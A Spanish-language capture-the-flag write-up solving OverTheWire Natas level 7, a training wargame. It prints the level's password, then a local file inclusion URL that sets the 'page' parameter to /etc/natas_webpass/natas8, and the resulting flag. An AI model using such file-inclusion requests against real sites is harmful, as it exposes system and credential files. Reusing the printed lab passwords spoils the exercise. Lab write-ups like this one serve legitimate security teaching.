#Natas Level 6 → Level 7

Username: natas7

URL:      http://natas7.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas7.natas.labs.overthewire.org** 
- **Usuario    : natas7**
- **Contraseña : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**

La contraseña la hemos sacado del nivel anterior.

Accedemos a la página y nos salen dos enlaces:

```html
  home
  about
```

Vemos el código fuente de la página y nos muestra lo siguiente:

```html
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
```

Nos dice que la password para el usuario **natas8** está en la dirección **/etc/natas_webpass/natas8**

Observamos como hace la petición para las dos páginas:

```html
http://natas7.natas.labs.overthewire.org/index.php?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=about
```

Probamos a poner el valor **/etc/natas_webpass/natas8** en el parámetro **page** de esta forma

```html
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Y nos devuelve un texto que contiene la contraseña :)

**FLAG** = {DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe}
